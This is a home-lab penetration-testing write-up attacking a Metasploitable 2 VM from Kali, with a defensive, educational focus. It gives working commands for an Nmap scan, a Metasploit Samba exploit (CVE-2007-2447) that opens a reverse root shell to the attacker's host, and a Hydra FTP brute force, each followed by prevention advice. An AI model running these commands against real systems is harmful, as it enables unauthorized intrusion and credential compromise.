**Phase 2 — Attacks**



*What this phase is about?*



This is where the lab gets interesting. Using Kali Linux as my 

attacker machine, I ran real offensive techniques against 

Metasploitable — the same tools and methods used in actual 

penetration tests.



The goal wasn't just to "get root" and move on. For every 

attack I asked myself three questions:

\- Why does this vulnerability exist?

\- How would a defender detect this?

\- What should have been done to prevent it?



That's the Blue Team mindset I'm building.



\---



**Target Information**



| Field | Detail |

|-------|--------|

| Target IP | 10.0.2.3 (Metasploitable 2) |

| Attacker IP | 10.0.2.15 (Kali Linux 2025.3) |

| Network | Cyberlab (10.0.2.0/24) |



\---



**Attack Index**



**Attack 01 — Network Reconnaissance (Nmap)**



**What I did :**

Before attacking anything, I needed to know what was running 

on the target. Nmap scans the network and reveals open ports, 

running services, and software versions.



**Command** :

```bash

sudo nmap -sV -O 10.0.2.3 -oN \~/lab/phase2/scans/metasploitable\_initial.txt

```



*What the flags mean:*

\- `-sV` — detect service versions on each open port

\- `-O` — attempt to identify the operating system

\- `-oN` — save output to a file for documentation



*Why this matters:*

Reconnaissance is Step 1 of every real attack. You can't 

exploit what you don't know exists. In a real engagement 

this scan would reveal the attack surface — every open port 

is a potential entry point.



**MITRE ATT\&CK :** T1046 — Network Service Discovery





\---



\### Attack 02 — Samba Exploitation (Metasploit)



*What I did:*



Exploited CVE-2007-2447, a critical vulnerability in Samba 

3.0.20. Got a full root shell on Metasploitable with zero 

authentication.



*The vulnerability explained:*



Samba is a service that lets Linux machines share files with 

Windows machines over the network. In version 3.0.20, the 

username field during login was passed directly to /bin/sh 

without being sanitized. This means an attacker can inject 

shell commands through the username field and have them 

executed by the server — as root.



**Commands** :

```bash

msfconsole

use exploit/multi/samba/usermap\_script

set RHOSTS 10.0.2.3

set PAYLOAD cmd/unix/reverse

set LHOST 10.0.2.15

run

whoami  # output: root

```



**Result**: Full root shell — complete control of the system



**CVE**: CVE-2007-2447 | \*\*CVSS:\*\* 10.0 (Critical)



*How to prevent it:*



\- Patch Samba — fix has existed since 2007

\- Disable SMB if file sharing isn't needed

\- Firewall port 445 from untrusted networks

\- Never run services as root user



\*\*MITRE ATT\&CK:\*\* T1190 — Exploit Public-Facing Application



\---



**Attack 03 — FTP Brute Force (Hydra)**



*What I did:*



Used Hydra to automatically try password combinations against 

the FTP service until finding the correct credentials.



*The vulnerability explained*:



Metasploitable runs FTP with default credentials 

(msfadmin:msfadmin) and no account lockout policy. Without 

lockout, an attacker can try unlimited passwords with no 

consequences. Hydra cracked it in 4 attempts.



**Command**:

```bash

hydra -l msfadmin -P \~/lab/custom-pass.txt 10.0.2.3 ftp -t 4 -V

```



*What the flags mean*:



\-> `-l msfadmin` — the username to attack

\-> `-P` — path to password wordlist

\-> `-t 4` — 4 parallel threads

\-> `-V` — verbose, show every attempt



**Result:** `\[21]\[ftp] host: 10.0.2.3 login: msfadmin password: msfadmin`



*How to prevent it:*



\- Never use default credentials

\- Lock accounts after 3-5 failed attempts

\- Replace FTP with SFTP (encrypted)

\- Alert on repeated failed logins in SIEM



\*\*MITRE ATT\&CK:\*\* T1110.001 — Brute Force: Password Guessing

\---



***Key Findings***



| Vulnerability | Severity | Root Cause |

|---------------|----------|------------|

| CVE-2007-2447 (Samba) | Critical | Unpatched 19-year-old software |

| Default FTP credentials | High | No password policy enforced |

| No account lockout | High | Missing security configuration |



***Biggest Takeaway***



Every single vulnerability I exploited today had a known fix. 

The Samba patch came out in 2007. Default credentials are 

preventable by policy. Account lockout is a checkbox in any 

decent system configuration.



Most real breaches aren't zero-days — they're unpatched 

software and poor configuration. That's what this phase showed me.

